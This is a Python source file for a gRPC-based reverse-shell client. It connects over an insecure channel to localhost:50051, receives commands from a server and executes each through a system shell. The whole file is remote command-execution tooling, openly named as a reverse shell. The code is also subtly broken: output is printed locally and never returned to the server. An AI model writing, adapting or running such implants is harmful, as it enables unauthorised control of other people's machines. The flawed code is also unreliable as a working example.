import grpc
import asyncio
import subprocess
import reverse_shell_pb2
import reverse_shell_pb2_grpc

class ReverseShellClient:
    def __init__(self, channel):
        self.stub = reverse_shell_pb2_grpc.ReverseShellServiceStub(channel)

    async def start_session(self):
        # Start the session and handle commands from the server
        async for response in self.stub.StartSession(iter([])):
            if response.is_active:
                command = response.output.strip()
                if command:
                    print(f"Received Command: {command}")
                    await self.execute_command(command)
            else:
                print(response.output)
                break

    async def execute_command(self, command):
        # Execute the received command
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        while True:
            output = await process.stdout.read(1024)
            if output:
                print(output.decode(), end='')
            else:
                break

        stderr = await process.stderr.read()
        if stderr:
            print(stderr.decode(), end='')

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    channel = grpc.aio.insecure_channel('localhost:50051')
    client = ReverseShellClient(channel)
    loop.run_until_complete(client.start_session())
